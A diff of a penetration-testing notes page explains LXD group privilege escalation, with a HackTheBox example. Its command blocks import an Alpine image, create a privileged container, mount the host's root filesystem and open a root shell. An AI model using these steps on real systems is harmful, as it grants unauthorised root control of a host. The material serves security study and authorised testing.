@@ -10,9 +10,9 @@ tags:
 ---
 # lxd
 
-LXD is similar to Docker and is Ubuntu's container manager. LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.
+Linux Daemon ([LXD](https://github.com/lxc/lxd)) is similar to Docker and is Ubuntu's container manager. LXD is a management API for dealing with LXC containers on Linux systems. It will perform tasks for any members of the local lxd group. It does not make an effort to match the permissions of the calling user to the function it is asked to perform.
 
-A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package.
+Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group.
 
 [Source: https://www.hackingarticles.in/lxd-privilege-escalation/](https://www.hackingarticles.in/lxd-privilege-escalation/). In this article, you can find a good explanation about how lxc works. [Original source: https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071](https://bugs.launchpad.net/ubuntu/+source/lxd/+bug/1829071).
 
@@ -20,7 +20,8 @@ A member of the local “lxd” group can instantly escalate the privileges to r
 
 Privilege escalation through lxd requires the access of local account and that that local account belongs to the group lxd.
 
-In order to take escalate the root privilege of the host machine you have to create an imag for lxd thus you need to perform the following the action:
+### Create our own container with Alpine and transfer it to the target system
+In order to take escalate the root privilege of the host machine you have to create an image for lxd thus you need to perform the following the action:
 
 **Steps to be performed on the attacker machine:**
 
@@ -58,10 +59,13 @@ lxc start ignite
 
 # Launch a shell command in the container
 lxc exec ignite /bin/sh
+
+# Access the system via 
+ls -l /mnt/root
 ```
 
 
-### Example from HackTheBox
+#### Example from HackTheBox
 
 Unzip the Alpine image.
 
@@ -73,12 +77,15 @@ Start the LXD initialization process. Choose the defaults for each prompt. Consu
 
 ```shell-session
 lxd init
+
+# List available images
+lxc image list
 ```
 
 Import the local image.
 
 ```shell-session
-lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
+lxc image import alpine.tar.gz --alias alpine
 ```
 
 Start a privileged container with the `security.privileged` set to `true` to run the container without a UID mapping, making the root user in the container the same as the root user on the host.
@@ -90,7 +97,7 @@ lxc init alpine r00t -c security.privileged=true
 Mount the host file system.
 
 ```shell-session
- lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
 ```
 
 Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.
@@ -98,6 +105,7 @@ Finally, spawn a shell inside the container instance. We can now browse the moun
 ```shell-session
 lxc start r00t
 lxc exec r00t /bin/sh
+ls -l /mnt/root
 ```
 
 ## Docker
